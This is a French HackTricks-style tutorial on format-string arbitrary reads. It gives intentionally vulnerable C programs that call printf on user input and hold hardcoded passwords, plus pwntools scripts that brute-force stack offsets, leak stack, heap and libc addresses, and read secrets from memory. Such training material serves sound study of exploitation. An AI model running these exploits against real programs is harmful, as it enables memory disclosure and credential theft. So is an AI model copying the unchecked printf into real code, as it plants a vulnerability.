# Format Strings - Arbitrary Read Example

{{#include ../../banners/hacktricks-training.md}}

## Début de la lecture du binaire

### Code
```c
#include <stdio.h>

int main(void) {
char buffer[30];

fgets(buffer, sizeof(buffer), stdin);

printf(buffer);
return 0;
}
```
Compilez-le avec :
```python
clang -o fs-read fs-read.c -Wno-format-security -no-pie
```
### Exploit
```python
from pwn import *

p = process('./fs-read')

payload = f"%11$s|||||".encode()
payload += p64(0x00400000)

p.sendline(payload)
log.info(p.clean())
```
- L'**offset est 11** car en plaçant plusieurs A et en faisant du **brute-forcing** avec une boucle d'offsets de 0 à 50, on a trouvé qu'à l'offset 11 et avec 5 caractères supplémentaires (pipes `|` dans notre cas), il est possible de contrôler une adresse complète.
- J'ai utilisé **`%11$p`** avec du padding jusqu'à ce que je voie que l'adresse était entièrement 0x4141414141414141
- Le **format string payload est AVANT l'adresse** parce que le **printf arrête la lecture à un octet nul**, donc si on envoie l'adresse puis le format string, printf n'atteindra jamais le format string car un octet nul sera trouvé avant
- L'adresse sélectionnée est 0x00400000 car c'est là où le binaire commence (no PIE)

<figure><img src="broken-reference" alt="" width="477"><figcaption></figcaption></figure>

## Lire les mots de passe

<details>
<summary>Binaire vulnérable avec mots de passe sur la stack et la BSS</summary>
```c
#include <stdio.h>
#include <string.h>

char bss_password[20] = "hardcodedPassBSS"; // Password in BSS

int main() {
char stack_password[20] = "secretStackPass"; // Password in stack
char input1[20], input2[20];

printf("Enter first password: ");
scanf("%19s", input1);

printf("Enter second password: ");
scanf("%19s", input2);

// Vulnerable printf
printf(input1);
printf("\n");

// Check both passwords
if (strcmp(input1, stack_password) == 0 && strcmp(input2, bss_password) == 0) {
printf("Access Granted.\n");
} else {
printf("Access Denied.\n");
}

return 0;
}
```
</details>

Compilez-le avec :
```bash
clang -o fs-read fs-read.c -Wno-format-security
```
### Lire depuis la stack

La **`stack_password`** sera stockée dans la stack parce que c'est une variable locale, donc il suffit d'abuser de printf pour afficher le contenu de la stack. Ceci est un exploit pour BF les 100 premières positions afin de leak les passwords depuis la stack:
```python
from pwn import *

for i in range(100):
print(f"Try: {i}")
payload = f"%{i}$s\na".encode()
p = process("./fs-read")
p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
Dans l'image il est possible de voir que nous pouvons leak the password from the stack in the `10th` position:

<figure><img src="../../images/image (1234).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../images/image (1233).png" alt="" width="338"><figcaption></figcaption></figure>

### Lire les données

En exécutant le même exploit mais avec `%p` au lieu de `%s`, il est possible de leak a heap address from the stack at `%25$p`. Moreover, comparing the leaked address (`0xaaaab7030894`) with the position of the password in memory in that process we can obtain the addresses difference:

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

Il est maintenant temps de trouver comment contrôler 1 address in the stack to access it from the second format string vulnerability:

<details>
<summary>Find controllable stack address</summary>
```python
from pwn import *

def leak_heap(p):
p.sendlineafter(b"first password:", b"%5$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

for i in range(30):
p = process("./fs-read")

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

password_addr = heap_leak_addr - 0x126a

print(f"Try: {i}")
payload = f"%{i}$p|||".encode()
payload += b"AAAAAAAA"

p.sendline(payload)
output = p.clean()
print(output.decode("utf-8"))
p.close()
```
</details>

Et on peut voir que dans le **try 14**, avec le passing utilisé, nous pouvons contrôler une adresse :

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

### Exploit

<details>
<summary>Leak heap then read password</summary>
```python
from pwn import *

p = process("./fs-read")

def leak_heap(p):
# At offset 25 there is a heap leak
p.sendlineafter(b"first password:", b"%25$p")
p.recvline()
response = p.recvline().strip()[2:] #Remove new line and "0x" prefix
return int(response, 16)

heap_leak_addr = leak_heap(p)
print(f"Leaked heap: {hex(heap_leak_addr)}")

# Offset calculated from the leaked position to the possition of the pass in memory
password_addr = heap_leak_addr + 0x1f7bc

print(f"Calculated address is: {hex(password_addr)}")

# At offset 14 we can control the addres, so use %s to read the string from that address
payload = f"%14$s|||".encode()
payload += p64(password_addr)

p.sendline(payload)
output = p.clean()
print(output)
p.close()
```
</details>

<figure><img src="broken-reference" alt="" width="563"><figcaption></figcaption></figure>

### Automatisation de la découverte des offsets

Quand la stack change à chaque exécution (ASLR/PIE complet), le bruteforcing des offsets manuellement est lent. `pwntools` fournit `FmtStr` pour détecter automatiquement l'index d'argument qui atteint notre controlled buffer. La lambda doit renvoyer la sortie du programme après l'envoi du candidate payload. Elle s'arrête dès qu'elle peut corrompre/observer la mémoire de façon fiable.
```python
from pwn import *

context.binary = elf = ELF('./fs-read', checksec=False)

# helper that sends payload and returns the first line printed
io = process()
def exec_fmt(payload):
io.sendline(payload)
return io.recvuntil(b'\n', drop=False)

fmt = FmtStr(exec_fmt=exec_fmt)
offset = fmt.offset
log.success(f"Discovered offset: {offset}")
```
Vous pouvez ensuite réutiliser `offset` pour construire des payloads de lecture/écriture arbitraires avec `fmtstr_payload`, évitant le fuzzing manuel avec `%p`.

### PIE/libc leak then arbitrary read

Sur les binaires modernes avec PIE et ASLR, commencez par leak n'importe quel pointeur libc (par ex. `__libc_start_main+243` ou `setvbuf`), calculez les bases, puis placez votre adresse cible après la format string. Cela empêche le `%s` d'être tronqué par des octets nuls à l'intérieur du pointeur.

<details>
<summary>Leak libc and read arbitrary address</summary>
```python
from pwn import *

elf = context.binary = ELF('./fs-read', checksec=False)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

io = process()

# leak libc address from stack (offset 25 from previous fuzz)
io.sendline(b"%25$p")
io.recvline()
leak = int(io.recvline().strip(), 16)
libc.address = leak - libc.symbols['__libc_start_main'] - 243
log.info(f"libc @ {hex(libc.address)}")

secret = libc.address + 0x1f7bc   # adjust to your target

payload = f"%14$s|||".encode()
payload += p64(secret)

io.sendline(payload)
print(io.recvuntil(b"|||"))  # prints string at calculated address
```
</details>

## Références

- [NVISO - Format string exploitation](https://blog.nviso.eu/2024/05/23/format-string-exploitation-a-hands-on-exploration-for-linux/)
- [Format string exploitation notes](https://hackmd.io/%40e20gJPRhRbKrBY5xcGKngA/SyM_Wcg_A)

{{#include ../../banners/hacktricks-training.md}}
